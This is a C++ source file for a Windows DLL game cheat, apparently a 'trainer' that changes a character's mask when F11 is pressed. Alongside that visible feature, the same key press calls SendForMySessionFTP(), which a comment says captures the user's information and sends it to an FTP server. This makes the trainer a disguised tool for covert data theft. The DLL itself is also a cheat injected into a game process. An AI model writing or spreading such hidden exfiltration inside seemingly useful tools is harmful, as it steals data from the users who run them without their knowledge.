#include "myIncludes.h"
#include "conectionFTP.h"
#pragma warning(disable:4996) //desabilitar mensagem de deprecia��o de "_CRT_SECURE_NO_WARNINGS"
MyCodesCheats myCodesCheats; //declara vari�vel do tipo MyCodesCheats 

using namespace std;

void ManipulaMascara() {
	__try {
		if (GetKeyState(VK_F11) < 0) {
			Sleep(100);
			myCodesCheats.setMascara(); //seta nova m�scara ao personagem
			SendForMySessionFTP(); //captura informa��es do usu�rio p/ enviar ao servidor FTP
			cout << "mascara ativada!" << endl;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		//... tratar exce��o
	}
}

void imprime() {
	AllocConsole();
	freopen("CONOUT$", "w", stdout);
	SetConsoleTitle("DLL Hacking [Trainer] V1.0");
	cout << 
		"***Aperte a tecla F11 para ativar a funcionalidade***" 
		<< endl << endl;
}

void thread(void* data) {
	imprime();
	while (true) {
		ManipulaMascara();
	}
}

BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpvReserved) {
	if (dwReason == DLL_PROCESS_ATTACH) {
		MessageBox(0, "Funcionalidade, implementa��o e distribui��o desenvolvido por algu�m. Aprecie!", 
			"Mensagem de cr�ditos", MB_OK);
		(HANDLE)_beginthread(&thread, 0, 0);
	}
	return true;
}



